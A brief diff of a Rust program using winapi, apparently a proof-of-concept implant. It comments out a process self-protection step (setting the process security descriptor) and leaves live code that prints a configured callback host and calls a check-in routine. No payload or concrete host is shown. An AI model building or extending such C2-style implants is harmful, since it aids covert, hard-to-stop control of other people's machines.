@@ -27,7 +27,7 @@ use winapi::{
 }};
 
 fn main() {
-    let pid = unsafe { 
+    /*let pid = unsafe { 
         GetCurrentProcessId() 
     };
 
@@ -35,7 +35,7 @@ fn main() {
 
     selfprotect::set_process_security_descriptor();
 
-    println!("[*] Process Protected. Press Enter to Exit PoC");
+    println!("[*] Process Protected. Press Enter to Exit PoC");*/
 
     println!("URL: {}", config::callback_host);
     checkin::checkin();
